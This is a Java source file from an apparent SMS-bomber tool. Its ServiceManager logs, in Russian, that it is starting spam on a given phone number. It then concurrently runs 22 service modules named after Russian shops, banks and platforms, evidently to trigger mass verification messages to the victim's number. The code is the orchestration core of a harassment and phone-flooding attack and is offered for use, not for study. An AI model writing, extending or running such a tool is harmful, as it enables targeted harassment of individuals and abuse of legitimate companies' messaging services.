package me.oneqxz.b0mb3rrr.services;

import lombok.extern.log4j.Log4j2;
import me.oneqxz.b0mb3rrr.Config;
import me.oneqxz.b0mb3rrr.services.impl.*;

import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

@Log4j2
public class ServiceManager {

    private final Config config;
    ExecutorService executor = Executors.newVirtualThreadPerTaskExecutor();

    private final List<IService> services = new LinkedList<>();

    public ServiceManager(Config config) {
        this.config = config;
        log.info(STR."Запускаю спам на номер +\{config.getPhone()}");

        this.add();
        log.info(STR."Добавлено \{services.size()} сервисов.");

        this.run();
    }

    public void add()
    {
        this.services.add(new Eldorado());
        this.services.add(new Sms4b());
        this.services.add(new Sportmaster());
        this.services.add(new Sushivesla());
        this.services.add(new Bluefin());
        this.services.add(new Burgerkingrus());
        this.services.add(new Cian());
        this.services.add(new Citilink());
        this.services.add(new DnsShop());
        this.services.add(new Findclone());
        this.services.add(new GazpromBank());
        this.services.add(new ICQ());
        this.services.add(new IvI());
        this.services.add(new MosPizza());
        this.services.add(new Odnoklassniki());
        this.services.add(new Pomodoro());
        this.services.add(new ProSushi());
        this.services.add(new RabotaRu());
        this.services.add(new RichFamily());
        this.services.add(new Sayoris());
        this.services.add(new Sushirolla());
        this.services.add(new Tinkoff());
    }

    public void run()
    {
        for(IService service : this.services)
            executor.execute(new IServiceWorker(service, this.config));

        while (!executor.isTerminated()) {}
    }
}
